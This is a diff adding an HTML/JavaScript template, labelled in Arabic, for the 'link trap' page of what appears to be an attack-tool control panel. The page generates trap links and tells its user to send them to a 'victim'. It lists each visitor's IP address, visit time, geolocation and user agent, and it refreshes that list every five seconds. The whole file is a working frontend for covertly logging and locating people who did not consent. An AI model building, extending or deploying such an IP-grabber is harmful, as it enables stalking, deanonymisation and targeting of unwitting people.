@@ -1,0 +1,101 @@
+{% extends "base.html" %}{% set active='sniffer' %}
+{% block content %}
+<style>
+  .trap-header { text-align:center; padding:20px; background:linear-gradient(180deg,#1a0000,#0a0000); border:1px solid #ff0000; border-radius:15px; margin-bottom:20px; }
+  .trap-header h1 { color:#ff0000; text-shadow:0 0 10px #ff0000; margin:0; font-size:26px; }
+  .trap-btn { background:#ff0000; color:white; border:none; padding:15px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer; font-size:16px; margin-bottom:10px; }
+  .trap-link { background:#000; color:#0f0; padding:15px; border:1px solid #0f0; border-radius:8px; font-family:monospace; word-break:break-all; margin-top:10px; display:none; }
+  .victim-card { background:#0a0a0a; border:1px solid #333; border-radius:8px; padding:12px; margin-bottom:10px; }
+  .victim-ip { color:#ffcc00; font-weight:bold; font-family:monospace; font-size:16px; }
+  .victim-meta { color:#888; font-size:12px; margin-top:5px; }
+  .refresh-btn { background:#333; color:white; border:none; padding:8px; border-radius:5px; width:100%; cursor:pointer; margin-bottom:10px; }
+</style>
+
+<div class="trap-header">
+  <h1>🪤 صائد الروابط (Trap)</h1>
+  <p>توليد رابط فخ لتسجيل IP الضحايا تلقائياً.</p>
+</div>
+
+<div class="card">
+  <button class="trap-btn" onclick="createTrap()">🪤 توليد رابط فخ جديد</button>
+  <div id="trapLinkBox" class="trap-link"></div>
+</div>
+
+<div class="card">
+  <h3>🎯 الضحايا المسجلون:</h3>
+  <button class="refresh-btn" onclick="loadVictims()">🔄 تحديث القائمة</button>
+  <div id="victimsList">جارٍ التحميل...</div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function createTrap() {
+    const box = document.getElementById("trapLinkBox");
+    box.style.display = "block";
+    box.textContent = "⏳ جاري التوليد...";
+    
+    try {
+        const res = await fetch("/api/trap/create", {method: "POST"});
+        const data = await res.json();
+        if(data.success) {
+            box.innerHTML = `✅ الرابط جاهز:<br><br><a href="${data.url}" target="_blank" style="color:#0f0;">${data.url}</a><br><br><small>أرسل هذا الرابط للضحية. عندما يفتحه، سيتم تسجيل IP الخاص به هنا.</small>`;
+            loadVictims();
+        } else {
+            box.textContent = "❌ " + data.message;
+        }
+    } catch(e) { box.textContent = "❌ خطأ في الاتصال"; }
+}
+
+async function loadVictims() {
+    const list = document.getElementById("victimsList");
+    try {
+        const res = await fetch("/api/trap/list");
+        const data = await res.json();
+        
+        console.log("البيانات المستلمة:", data); // للمساعدة في التشخيص
+        
+        let html = "";
+        let count = 0;
+        
+        // معالجة البيانات بأي شكل كانت (قاموس أو مصفوفة)
+        if (data && typeof data === 'object') {
+            // إذا كانت البيانات قاموساً (المفاتيح هي معرفات الروابط)
+            for (const key in data) {
+                const trap = data[key];
+                if (trap && trap.visits && Array.isArray(trap.visits)) {
+                    trap.visits.forEach(v => {
+                        count++;
+                        let geoText = "غير معروف";
+                        if (v.geo) {
+                            if (v.geo.city) geoText = `${v.geo.city}, ${v.geo.country || ''}`;
+                            else if (v.geo.lat) geoText = `إحداثيات: ${v.geo.lat}, ${v.geo.lon}`;
+                        }
+                        
+                        html += `<div class="victim-card">
+                            <div class="victim-ip">🎯 ${v.ip || 'غير معروف'}</div>
+                            <div class="victim-meta">🕒 ${v.time || 'غير معروف'}</div>
+                            <div class="victim-meta">🌍 ${geoText}</div>
+                            <div class="victim-meta">📱 ${v.user_agent ? v.user_agent.substring(0, 60) : 'غير معروف'}...</div>
+                        </div>`;
+                    });
+                }
+            }
+        }
+        
+        if(count === 0) {
+            list.innerHTML = "<div style='text-align:center;color:var(--muted);'>لا يوجد ضحايا بعد. أنشئ رابطاً وشاركه.</div>";
+        } else {
+            list.innerHTML = `<div style='color:var(--ok); margin-bottom:10px;'>✅ تم تسجيل ${count} ضحية:</div>` + html;
+        }
+    } catch(e) { 
+        console.error("خطأ:", e);
+        list.innerHTML = "❌ خطأ في التحميل"; 
+    }
+}
+
+// تحديث تلقائي كل 5 ثوانٍ
+setInterval(loadVictims, 5000);
+loadVictims();
+</script>
+{% endblock %}
